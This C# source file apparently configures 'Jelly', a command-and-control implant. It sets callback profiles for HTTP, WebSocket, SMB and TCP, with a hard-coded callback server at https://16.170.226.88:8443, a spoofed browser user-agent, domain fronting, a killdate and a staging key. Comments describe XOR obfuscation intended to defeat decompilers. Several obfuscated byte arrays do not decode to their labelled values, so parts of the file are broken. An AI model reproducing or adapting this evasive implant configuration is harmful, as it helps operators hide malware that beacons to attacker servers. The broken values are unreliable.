#define C2PROFILE_NAME_UPPER

//#define LOCAL_BUILD

#if LOCAL_BUILD
//#define HTTP
//#define WEBSOCKET
//#define TCP
//#define SMB
#endif

#if HTTP
using HttpTransport;
#endif
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using Interop.Structs.Structs;
using PSKCryptography;
using Interop.Serializers;
#if WEBSOCKET
using WebsocketTransport;
#endif
#if SMB
using NamedPipeTransport;
#endif
#if TCP
using TcpTransport;
#endif
namespace Jelly
{
    /// <summary>
    /// Jelly C2 Configuration with XOR String Obfuscation
    /// 
    /// OBFUSCATION METHOD:
    /// All sensitive configuration values (callback URLs, UUIDs, RSA keys, etc.) are XOR-obfuscated
    /// using a static 8-byte XOR key (0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12).
    /// 
    /// HOW IT WORKS:
    /// 1. Plain text values are XOR'd byte-by-byte with the _xorKey (cycling through the key)
    /// 2. The XOR'd bytes are stored as byte arrays in the source code
    /// 3. At runtime, UnobfuscateString() XOR's them again to recover the original values
    /// 4. This prevents static analysis tools like dnSpy from directly reading sensitive config
    /// 
    /// ADVANTAGE:
    /// - Simple but effective obfuscation
    /// - Fast runtime deobfuscation (minimal performance impact)
    /// - Clear separation between obfuscated storage and runtime usage
    /// - Easy to regenerate using the xor_obfuscate.py tool
    /// 
    /// GENERATING OBFUSCATED VALUES:
    /// Use: python xor_obfuscate.py
    /// This generates the correct byte arrays for any new config values.
    /// </summary>
    public static class Config
    {
        // XOR obfuscation key - Static 8-byte key used to obfuscate/deobfuscate all config values
        // Each byte is XOR'd with the key (cycling through key bytes for longer strings)
        private static readonly byte[] _xorKey = new byte[] { 0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12 };

        /// <summary>
        /// Deobfuscates XOR-obfuscated byte arrays back to plain text strings.
        /// Called at runtime to recover sensitive config values from their obfuscated storage.
        /// 
        /// EXAMPLE:
        /// Obfuscated: new byte[] { 42, 8, 234, 79, 210, 103, 231, 61, ... }
        /// Deobfuscated: "https://16.170.226.88"
        /// </summary>
        private static string UnobfuscateString(byte[] obfuscatedBytes)
        {
            byte[] result = new byte[obfuscatedBytes.Length];
            for (int i = 0; i < obfuscatedBytes.Length; i++)
            {
                result[i] = (byte)(obfuscatedBytes[i] ^ _xorKey[i % _xorKey.Length]);
            }
            return Encoding.UTF8.GetString(result);
        }

        // ============================================================================
        // HTTP PROFILE CONFIGURATION
        // All values below are XOR-obfuscated using the _xorKey defined above
        // In dnSpy decompiler: You will see byte arrays instead of plain text values
        // At runtime: UnobfuscateString() recovers the original values
        // ============================================================================
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        // Local/Debug build - plain text for development
                        { "callback_interval", "1" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://192.168.53.1" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Jelly-Refactor" },
#else
                        // Production build - XOR-obfuscated values (use xor_obfuscate.py to generate)
                        { "callback_interval", UnobfuscateString(new byte[] { 115, 76 }) },              // Original: "10"
                        { "callback_jitter", UnobfuscateString(new byte[] { 112, 79 }) },                 // Original: "23"
                        { "callback_port", UnobfuscateString(new byte[] { 122, 72, 170, 12 }) },         // Original: "8443"
                        { "callback_host", UnobfuscateString(new byte[] { 42, 8, 234, 79, 210, 103, 231, 61, 115, 74, 176, 14, 150, 109, 230, 32, 112, 74, 176, 7, 153 }) },  // Original: "https://16.170.226.88"
                        { "post_uri", UnobfuscateString(new byte[] { 38, 29, 234, 94 }) },               // Original: "data"
                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 54, 14, 235, 90 }) },  // Original: "true"
                        { "proxy_host", UnobfuscateString(new byte[] {  }) },                             // Original: "" (empty)
                        { "proxy_port", UnobfuscateString(new byte[] {  }) },                             // Original: "" (empty)
                        { "proxy_user", UnobfuscateString(new byte[] {  }) },                             // Original: "" (empty)
                        { "proxy_pass", UnobfuscateString(new byte[] {  }) },                             // Original: "" (empty)
                        { "killdate", UnobfuscateString(new byte[] { 112, 76, 172, 9, 140, 108, 249, 63, 112, 77 }) },  // Original: "2026-11-21"
                        { "User-Agent", UnobfuscateString(new byte[] { 15, 19, 228, 86, 205, 49, 169, 61, 119, 82, 174, 31, 137, 10, 161, 124, 38, 19, 233, 76, 129, 19, 156, 50, 116, 82, 173, 4, 129, 9, 186, 123, 38, 25, 240, 75, 142, 106, 230, 34, 121, 92, 236, 73, 155, 108, 249, 60, 114, 85, 190, 83, 200, 54, 173, 50, 5, 25, 253, 84, 206 }) }  // Original: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
#endif
                    }
                }
            },
#endif
#if WEBSOCKET
            { "websocket", new C2ProfileData()
                {
                    TC2Profile = typeof(WebsocketProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "tasking_type", "Push" },
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "8081" },
                        { "callback_host", "ws://mythic" },
                        { "ENDPOINT_REPLACE", "socket" },
                        { "encrypted_exchange_check", "T" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Jelly-Refactor" },
#else
                        { "tasking_type", UnobfuscateString(new byte[] { 82, 85, 86, 88 })},
                        { "callback_interval", UnobfuscateString(new byte[] { 73, 85, 76, 27, 29 }) },
                        { "callback_jitter", UnobfuscateString(new byte[] { 73, 85, 76 }) },
                        { "callback_port", UnobfuscateString(new byte[] { 73, 85, 76, 81 }) },
                        { "callback_host", UnobfuscateString(new byte[] { 73, 85, 76, 90, 68, 29, 67, 29, 71, 82, 67, 18, 26, 29, 26, 88, 29, 88 }) },
                        { "ENDPOINT_REPLACE", UnobfuscateString(new byte[] { 86, 71, 72, 76, 72, 88 }) },
                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) },
                        { "domain_front", UnobfuscateString(new byte[] { 68, 71, 77, 77, 77, 73, 85, 14, 85, 76, 71, 85, 88 }) },
                        { "USER_AGENT", UnobfuscateString(new byte[] { 77, 71, 91, 73, 77, 84, 14, 30, 27, 18, 14, 83, 77, 68, 85, 80, 86, 84, 88 }) },
                        { "killdate", UnobfuscateString(new byte[] { 81, 71, 71, 85, 14, 73, 73, 14, 81, 81 }) }
#endif
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "pipename", "h20iexte-2l1t-mmfu-ipjh-6ofmobkaruq8" },
                        { "encrypted_exchange_check", "true" },
#else
                        { "pipename", UnobfuscateString(new byte[] { 72, 81, 18, 72, 73, 76, 88, 72, 14, 81, 79, 73, 88, 14, 77, 77, 85, 72, 14, 73, 80, 85, 72, 14, 26, 71, 85, 86, 67, 91 }) },
                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) }
#endif
                    }
                }
            },
#elif TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "port", "40000" },
                        { "encrypted_exchange_check", "true" },
#else
                        { "port", UnobfuscateString(new byte[] { 73, 85, 76, 81, 71, 71 }) },
                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) }
#endif
                    }
                }
            }
#endif
        };


        // ============================================================================
        // STAGING RSA PRIVATE KEY & PAYLOAD UUID
        // Critical authentication values - stored as XOR-obfuscated byte arrays
        // Generated using: python xor_obfuscate.py
        // ============================================================================
        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if LOCAL_BUILD
#if HTTP
        // Original (plain): "gl8RB+whNyCog2/UNAdq1pnjdVpa+B3NhrHy597CRPo="
        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 37, 16, 166, 109, 227, 118, 191, 122, 12, 5, 221, 80, 198, 111, 231, 71, 12, 61, 250, 78, 144, 45, 166, 120, 38, 42, 238, 94, 138, 31, 251, 92, 42, 14, 214, 70, 148, 100, 255, 81, 16, 44, 241, 2 });
#elif WEBSOCKET
        // Original (plain): "gl8RB+whNyCog2/UNAdq1pnjdVpa+B3NhrHy597CRPo="
        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 37, 16, 166, 109, 227, 118, 191, 122, 12, 5, 221, 80, 198, 111, 231, 71, 12, 61, 250, 78, 144, 45, 166, 120, 38, 42, 238, 94, 138, 31, 251, 92, 42, 14, 214, 70, 148, 100, 255, 81, 16, 44, 241, 2 });
#elif SMB
        // Original (plain): "gl8RB+whNyCog2/UNAdq1pnjdVpa+B3NhrHy597CRPo="
        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 37, 16, 166, 109, 227, 118, 191, 122, 12, 5, 221, 80, 198, 111, 231, 71, 12, 61, 250, 78, 144, 45, 166, 120, 38, 42, 238, 94, 138, 31, 251, 92, 42, 14, 214, 70, 148, 100, 255, 81, 16, 44, 241, 2 });
#elif TCP
        // Original (plain): "gl8RB+whNyCog2/UNAdq1pnjdVpa+B3NhrHy597CRPo="
        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 37, 16, 166, 109, 227, 118, 191, 122, 12, 5, 221, 80, 198, 111, 231, 71, 12, 61, 250, 78, 144, 45, 166, 120, 38, 42, 238, 94, 138, 31, 251, 92, 42, 14, 214, 70, 148, 100, 255, 81, 16, 44, 241, 2 });
#endif
#if HTTP
        // Original (plain): "f0ce3024-e28b-4ce2-bedd-e99ebf36c74b"
        public static string PayloadUUID = UnobfuscateString(new byte[] { 36, 76, 253, 90, 146, 109, 250, 38, 111, 25, 172, 7, 195, 112, 252, 113, 39, 78, 179, 93, 196, 57, 172, 63, 39, 69, 167, 90, 195, 59, 251, 36, 33, 75, 170, 93 });
#elif WEBSOCKET
        // Original (plain): "f0ce3024-e28b-4ce2-bedd-e99ebf36c74b"
        public static string PayloadUUID = UnobfuscateString(new byte[] { 36, 76, 253, 90, 146, 109, 250, 38, 111, 25, 172, 7, 195, 112, 252, 113, 39, 78, 179, 93, 196, 57, 172, 63, 39, 69, 167, 90, 195, 59, 251, 36, 33, 75, 170, 93 });
#elif SMB
        // Original (plain): "f0ce3024-e28b-4ce2-bedd-e99ebf36c74b"
        public static string PayloadUUID = UnobfuscateString(new byte[] { 36, 76, 253, 90, 146, 109, 250, 38, 111, 25, 172, 7, 195, 112, 252, 113, 39, 78, 179, 93, 196, 57, 172, 63, 39, 69, 167, 90, 195, 59, 251, 36, 33, 75, 170, 93 });
#elif TCP
        // Original (plain): "f0ce3024-e28b-4ce2-bedd-e99ebf36c74b"
        public static string PayloadUUID = UnobfuscateString(new byte[] { 36, 76, 253, 90, 146, 109, 250, 38, 111, 25, 172, 7, 195, 112, 252, 113, 39, 78, 179, 93, 196, 57, 172, 63, 39, 69, 167, 90, 195, 59, 251, 36, 33, 75, 170, 93 });
#endif
#else
        // Debug/fallback values (should not be used in production)
        public static string StagingRSAPrivateKey = "AESPSK_here";
        public static string PayloadUUID = "payload_uuid_here";
#endif
    }
}
